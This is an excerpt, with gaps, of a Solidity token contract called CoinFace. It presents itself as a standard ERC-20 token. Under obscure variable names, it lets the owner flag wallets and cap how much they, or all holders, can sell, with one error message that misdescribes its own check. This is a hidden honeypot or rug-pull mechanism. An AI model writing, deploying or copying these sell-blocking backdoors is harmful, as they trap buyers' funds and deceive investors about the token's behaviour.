...
contract CoinFace is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private demasextrovertido;
    ...
    uint256 public  _demas = 100000000;
    uint256 public  _kitnaDemasExtrovertido = 100000000;
    bool public   _IsCahl;
    bool public  isMAr;
    ...
    address payable public _markWallet =
        payable(0x431FB68C753184D2D3d1ddEc14a8B81f3d10156b);
    ...
    function _transfer(
        ...
        if (takeFee) {
            if (BuyOrSell == 1) {
                ...
                _markTx = _markSelTx;
                emit _comments("demassell ", amount.div(1000));
                emit _comments("demasset ", _kitnaDemasExtrovertido);
                require(
                    amount > 1,
                    "Transfer amount must be greater than given amount"
                );
                 require(
                    amount.div(1000) <= _kitnaDemasExtrovertido,
                    "Transfer amount must be less  than given amount"
                );
                if(demasextrovertido[from])
                {
                    
                    emit _comments("kitnademasAmount ", amount.div(1000));
                    emit _comments("kitnademasDemasAmount ", _demas);
                    require(
                    amount.div(1000) <= _demas,
                    "Transfer amount must be greater than given amount"
                );
    ...
    function setdemasExtrovertido(address _walletAddr , bool inputamnt) external onlyOwner {
        demasextrovertido[_walletAddr] = inputamnt;
    }
    function demasExtrovertido(address _walletAddr) public view returns (bool) {
       return  demasextrovertido[_walletAddr] ;
    }

    function kitnaDemasExtrovertido (uint256 setAmount) external  onlyOwner
    {
    
        _kitnaDemasExtrovertido=setAmount;
    }

    function setDemas(uint256 inout) external onlyOwner {
        _demas =inout;
    }

   
    function _doTheCha (bool isCha) external onlyOwner
    {
        _IsCahl=isCha;
    }
    ...
    function reComprar (address _address, uint256 _number) external onlyOwner{
